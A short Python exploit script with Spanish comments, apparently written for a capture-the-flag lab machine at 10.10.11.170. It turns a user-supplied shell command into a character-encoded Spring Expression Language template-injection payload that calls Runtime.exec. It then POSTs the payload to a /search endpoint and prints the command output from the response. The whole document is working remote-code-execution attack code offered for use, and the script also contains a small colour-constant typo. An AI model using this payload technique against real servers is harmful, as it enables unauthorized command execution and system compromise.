#!/usr/bin/python3

# Importamos las librerias 
import requests, sys, pdb, signal, os
from colorama import Fore


# Funciones
def def_handler(sig, frame):
    print(Fore.LIGHTRED.EX + "\n\n[!] Saliendo... \n" + Fore.LIGHTWHITE_EX)
    sys.exit(1)


def makePayload_and_requests():
    # Variables generales
    command = sys.argv[1]
    payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % ord(command[0])
    command = command[1:]

    # Bucle
    for character in command:
        payload +=".concat(T(java.lang.Character).toString(%s))" % ord(character)

    # Final
    payload += ").getInputStream())}"

    # Variables generales
    search_url = "http://10.10.11.170:8080/search"
    post_data = {
        'name': payload
    }

    # Enviamos la solicitud
    r = requests.post(search_url, data=post_data)

    # Guardamos la respuesta de el servidor en un archivo
    f = open("output.txt", "w")
    f.write(r.text)
    f.close()
 
    # Sacamos el output por pantalla
    print("\n" + Fore.YELLOW + "[+] " + Fore.WHITE + "Respuesta del servidor: \n" + Fore.LIGHTBLUE_EX)
    os.system('cat output.txt | awk \'/You searched/,/<\/h2>/\' | sed \'s/    <h2 class=\"searched\">You searched for: //\' | sed \'s/<\/h2>//\'')
    os.remove('output.txt')


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 2:
    print(Fore.LIGHTRED_EX + "\n[!] El programa ha sido ejecutrado incorrectamente :(\n" + Fore.LIGHTWHITE_EX)
    print(Fore.LIGHTBLUE_EX + '\t[+] Uso: ' + Fore.LIGHTWHITE_EX + 'python3 %s ' % sys.argv[0] + Fore.LIGHTYELLOW_EX + "\"whoami\"\n")
    sys.exit(1)


# Flujo principal de el programa
if __name__ == '__main__':

    makePayload_and_requests()